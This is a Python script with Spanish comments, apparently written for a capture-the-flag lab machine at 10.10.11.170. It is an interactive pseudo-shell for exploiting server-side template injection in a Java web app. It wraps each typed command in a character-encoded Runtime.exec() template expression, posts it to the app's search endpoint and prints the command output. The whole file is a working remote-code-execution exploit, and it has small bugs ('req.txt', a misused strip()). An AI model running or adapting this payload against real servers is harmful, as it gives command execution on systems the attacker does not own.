#! /usr/bin/python3
from cmd import Cmd
import urllib.parse, argparse
import requests
from bs4 import BeautifulSoup

parser= argparse.ArgumentParser("Genera payloads SSTI...")
parser.add_argument("-u", "--url-encode", action="store_true", help="URL Encode")
args = parser.parse_args()
url_encode=args.url_encode


def searchPost(data):
    datapayload={"name":data} # parametros del post request, en este caso es name y data sera el payload
    url="http://10.10.11.170:8080/search" # url a la cual vamos enviar el post request 
    req = requests.post(url,data=datapayload)
    soup = BeautifulSoup(req.txt, 'html.parser')
    #la respuesta al payload se muestra en un h2, lo puedes cambiar cual sea tu caso
    h2 = soup.find_all('h2')[0]
    return h2.text.strip("You searched for:")




class Terminal(Cmd):
    prompt='\033[1;33mCommand ==>\033[0m '
    def decimal_encode(self,args):
        command=args
        decimals=[]
        for i in command:
            decimals.append(str(ord(i)))
        #iniciamos el payload y agregamos el primer unicode    
        payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
        # agregamos desde el segundo hasta el final todos los unicodes restantes
        for i in decimals[1:]:
            line='.concat(T(java.lang.Character).toString({}))'.format(i)
            payload +=line
        #aqui completamos el payload {}
        payload = payload + ').getInputStream())}'
        #encodea los caracteres especiales en url encode, si decidimos al principio encodear nuestra payload
        
        if url_encode:
            payload_encoded=urllib.parse.quote_plus(payload,safe='')
            response = searchPost(payload_encoded)
            return response
        else:
            response = searchPost(payload)
            return response

    def default(self,args):
        print(self.decimal_encode(args))
        print()




try:
    term=Terminal()
    term.cmdloop()
except KeyboardInterrupt:
    print("Chao!!");
    quit()

